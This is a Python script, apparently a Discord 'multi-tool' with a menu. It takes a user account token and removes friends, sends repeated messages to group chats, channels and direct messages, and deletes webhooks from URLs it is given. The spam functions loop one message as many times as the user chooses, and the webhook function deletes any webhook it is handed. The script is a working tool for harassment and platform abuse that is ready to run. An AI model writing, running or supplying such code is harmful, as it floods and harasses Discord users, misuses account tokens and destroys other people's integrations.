import requests
import threading
import os
from pystyle import Colorate, Colors

def print_banner():
    banner = """
                    ___.-------.___
                _.-' ___.--;--.___ `-._
             .-' _.-'  /  .+.  \  `-._ `-.
           .' .-'      |-|-o-|-|      `-. `.
          (_ <O__      \  `+'  /      __O> _)
            `--._``-..__`._|_.'__..-''_.--'
                  ``--._________.--''
    """
    print(Colorate.Horizontal(Colors.white_to_blue, banner))

def remove_friend():
    token = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Your Token: '))
    user_id = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter User ID to Remove friend '))

    url = f'https://discord.com/api/v9/users/@me/relationships/{user_id}'
    headers = {'Authorization': token}

    response = requests.delete(url, headers=headers)

    if response.status_code == 204:
        print(Colorate.Horizontal(Colors.white_to_blue, f"Successfully removed user {user_id} as a friend."))
    else:
        print(Colorate.Horizontal(Colors.white_to_blue, f"Error removing user as a friend: {response.status_code}"))

def gc_spam():
    token = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Your Token: '))
    gc_id = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter GC ID: '))
    message_content = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Message to Send: '))
    repeat_count = int(input(Colorate.Horizontal(Colors.white_to_blue, 'Enter How Many Times to Send the Message: ')))

    url = f'https://discord.com/api/v9/channels/{gc_id}/messages'
    headers = {'Authorization': token}
    payload = {'content': message_content}

    for _ in range(repeat_count):
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(Colorate.Horizontal(Colors.white_to_blue, 'Success'), token[:-5] + '*****', response)
        elif response.status_code == 401:
            print(Colorate.Horizontal(Colors.white_to_blue, 'Invalid'), token[:-5] + '*****', response)
        elif response.status_code == 429:
            print(Colorate.Horizontal(Colors.white_to_blue, 'Rate Limit'), token[:-5] + '*****', response)
        elif response.status_code == 403:
            print(Colorate.Horizontal(Colors.white_to_blue, 'Invalid / Banned'), token[:-5] + '*****', response)
        else:
            print(Colorate.Horizontal(Colors.white_to_blue, 'Unknown Error'), token[:-5] + '*****', response)

def spam_channel():
    token = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Token: '))
    channel_id = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Channel ID: '))
    message_content = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Message: '))
    repeat_count = int(input(Colorate.Horizontal(Colors.white_to_blue, 'Enter how many times to spam: ')))

    def spammer():
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
        headers = {'Authorization': token}
        payload = {'content': message_content}

        for _ in range(repeat_count):
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code == 204:
                print(Colorate.Horizontal(Colors.white_to_blue, 'Sending'), token[:-5] + '*****', response)
            elif response.status_code == 401:
                print(Colorate.Horizontal(Colors.white_to_blue, 'Error'), token[:-5] + '*****', response)
            elif response.status_code == 429:
                print(Colorate.Horizontal(Colors.white_to_blue, 'Error'), token[:-5] + '*****', response)
            elif response.status_code == 403:
                print(Colorate.Horizontal(Colors.white_to_blue, 'Invalid'), token[:-5] + '*****', response)
            else:
                print(Colorate.Horizontal(Colors.white_to_blue, 'Error'), token[:-5] + '*****', response)

    thread = threading.Thread(target=spammer)
    thread.start()
    thread.join()

def dm_spam():
    token = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Your Token: '))
    user_id = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Discord User ID: '))
    message_content = input(Colorate.Horizontal(Colors.white_to_blue, 'Enter Message to Send: '))
    repeat_count = int(input(Colorate.Horizontal(Colors.white_to_blue, 'Enter How Many Times to Send the Message: ')))

    url = f'https://discord.com/api/v9/users/@me/channels'
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    payload = {'recipient_id': user_id}

    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 200:
        dm_channel_id = response.json().get('id', '')
        if dm_channel_id:
            url = f'https://discord.com/api/v9/channels/{dm_channel_id}/messages'
            payload = {'content': message_content}
            
            for _ in range(repeat_count):
                response = requests.post(url, json=payload, headers=headers)
                if response.status_code == 200:
                    print(Colorate.Horizontal(Colors.white_to_blue, 'Message Sent Successfully'))
                else:
                    print(Colorate.Horizontal(Colors.white_to_blue, 'Error Sending Message'), response)
    else:
        print(Colorate.Horizontal(Colors.white_to_blue, 'Error Creating DM Channel'), response)

def delete_webhook():
    webhook = input(Colorate.Horizontal(Colors.white_to_blue, "Enter webhook: "))
    requests.delete(webhook)
    check = requests.get(webhook)
    if check.status_code == 404:
        print(Colorate.Horizontal(Colors.white_to_blue, "\nWebhook removed"))
    elif check.status_code == 200:
        print(Colorate.Horizontal(Colors.white_to_blue, "\nError"))
    test = requests.get(webhook)
    if test.status_code == 404:
        print(Colorate.Horizontal(Colors.white_to_blue, "\nInvalid"))
    elif test.status_code == 200:
        print(Colorate.Horizontal(Colors.white_to_blue, "\nValid"))
        delete_webhook()

def main():
    print_banner()
    while True:
        print("\n[1] Remove Friend")
        print("[2] Group Chat Spam")
        print("[3] Channel Spam")
        print("[4] DM Spam")
        print("[5] Delete Webhook")
        print("[6] Exit")
        choice = input("$-> ")
        
        if choice == '1':
            remove_friend()
        elif choice == '2':
            gc_spam()
        elif choice == '3':
            spam_channel()
        elif choice == '4':
            dm_spam()
        elif choice == '5':
            delete_webhook()
        elif choice == '6':
            print("Exiting...")
            break
        else:
            print("Invalid choice, try again.")

if __name__ == "__main__":
    main()

